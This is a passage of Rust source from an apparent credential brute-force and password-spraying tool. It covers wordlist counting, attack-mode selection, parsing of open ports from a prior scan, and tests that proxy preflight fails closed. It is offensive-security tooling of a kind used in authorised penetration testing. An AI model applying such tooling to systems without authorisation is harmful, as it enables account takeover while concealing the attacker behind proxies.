    if s.len() > max_len { s.chars().take(max_len).collect() } else { s.to_string() }
}

fn count_lines_fast(path: &std::path::Path) -> Result<u64, AttackError> {
    // Coba mmap dulu untuk kecepatan, fallback ke buffered read.
    if let Ok(lines) = super::wordlist::load_wordlist_mmap(path) {
        return Ok(lines.len() as u64);
    }
    let content = std::fs::read_to_string(path)
        .map_err(|e| AttackError::wordlist(path.to_path_buf(), e.to_string()))?;
    Ok(content
        .lines()
        .map(|l| l.trim())
        .filter(|l| !l.is_empty() && !l.starts_with('#'))
        .count() as u64)
}

fn expand_mode_for(config: &AttackConfig) -> ExpandMode {
    if config.spray_mode {
        ExpandMode::Spray
    } else if config.single_user_mode {
        ExpandMode::SingleUser
    } else {
        ExpandMode::Cartesian
    }
}

/// F5.3: parse file hasil `scan-ports -o`.
/// Format utama TSV `host<TAB>port<TAB>service...` (hanya port terbuka yang
/// ditulis scanner), plus header "Veltrix Scan Results". Toleran terhadap
/// baris `host:port` polos.
pub fn load_only_open(
    path: &std::path::Path,
) -> Result<std::collections::HashSet<(String, u16)>, AttackError> {
    let content = std::fs::read_to_string(path)
        .map_err(|e| AttackError::io("only-open", format!("cannot read {}: {}", path.display(), e)))?;
    let mut out = std::collections::HashSet::new();
    for raw in content.lines() {
        let line = raw.trim();
        if line.is_empty() || line.starts_with("Veltrix") || line.starts_with("===") {
            continue;
        }
        // Coba TSV/whitespace dulu: host port ...
        let parts: Vec<&str> = line.split_whitespace().collect();
        if parts.len() >= 2 {
            if let Ok(port) = parts[1].trim_matches(|c| c == ':' || c == ',').parse::<u16>() {
                if port > 0 {
                    out.insert((parts[0].to_string(), port));
                    continue;
                }
            }
        }
        // Fallback host:port.
        if let Some(pos) = line.rfind(':') {
            if let Ok(port) = line[pos + 1..].trim().parse::<u16>() {
                let host = line[..pos].trim().trim_matches(|c| c == '[' || c == ']');
                if !host.is_empty() && port > 0 {
                    out.insert((host.to_string(), port));
                }
            }
        }
    }
    if out.is_empty() {
        return Err(AttackError::config(format!(
            "no open host:port entries parsed from {}",
            path.display()
        )));
    }
    Ok(out)
}

#[cfg(test)]
mod tests {
    use super::*;

    async fn local_proxy() -> (tokio::task::JoinHandle<()>, ProxyConfig) {
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let port = listener.local_addr().unwrap().port();
        let h = tokio::spawn(async move {
            // Terima 1 koneksi preflight lalu selesai.
            let _ = listener.accept().await;
        });
        let p = ProxyConfig::parse(&format!("socks5://127.0.0.1:{}", port)).unwrap();
        (h, p)
    }

    fn dead_proxy() -> ProxyConfig {
        ProxyConfig::parse("socks5://127.0.0.1:59999").unwrap()
    }

    #[tokio::test]
    async fn preflight_all_dead_fails_closed() {
        let r = AttackOrchestrator::preflight_proxies(vec![dead_proxy()], false).await;
        assert!(r.is_err(), "all-dead proxies must fail closed");
    }

    #[tokio::test]
    async fn preflight_drops_dead_keeps_alive() {
        let (h, alive) = local_proxy().await;
        let r = AttackOrchestrator::preflight_proxies(vec![dead_proxy(), alive], false)
            .await
            .unwrap();
        assert_eq!(r.len(), 1);
        let _ = h.await;
    }

    #[tokio::test]
    async fn preflight_strict_rejects_partial() {
        let (h, alive) = local_proxy().await;
        let r = AttackOrchestrator::preflight_proxies(vec![alive, dead_proxy()], true).await;
        assert!(r.is_err(), "--check-proxy must abort on any dead proxy");
        let _ = h.await;
    }

    #[tokio::test]
    async fn preflight_empty_is_ok() {
        let r = AttackOrchestrator::preflight_proxies(vec![], false).await.unwrap();
        assert!(r.is_empty());
    }
}
